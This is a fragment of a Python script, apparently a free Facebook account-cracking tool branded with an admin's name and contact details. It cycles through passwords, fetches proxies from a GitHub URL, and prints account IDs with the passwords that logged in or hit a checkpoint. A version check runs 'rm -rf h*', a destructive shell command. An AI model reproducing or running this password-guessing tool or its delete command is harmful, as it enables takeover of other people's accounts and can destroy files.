...
\x1b[1;97m------------------------\x1b[1;97m------------------------
\n\x1b[1;92m   ADMIN : \x1b[1;97mAzan   \x1b[1;95mTOOL:\x1b[1;97mFREE     \x1b[1;91mV:\x1b[1;97m1.2.0
         \x1b[1;92m  WHATSAPP: \x1b[1;95m+923165456679
          \x1b[1;92m FACEBOOK:  \x1b[1;95mAZAN ALI
\033[1;37m------------------------\033[1;37m------------------------ """ 
loop = 0
oks = []
cps = []
try:
    ...
    proxy = requests.get('https://raw.githubusercontent.com/Mr-Azan/Azan/main/tr.txt').text.splitlines()
    v = 5.2
    update = requests.get('https://raw.githubusercontent.com/Mr-Azan/Azan/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf h*')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;32m[Successful] '+cid+' | '+ps+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;31m[Checkpoint] '+cid+' | '+ps+'\033[0;97m')
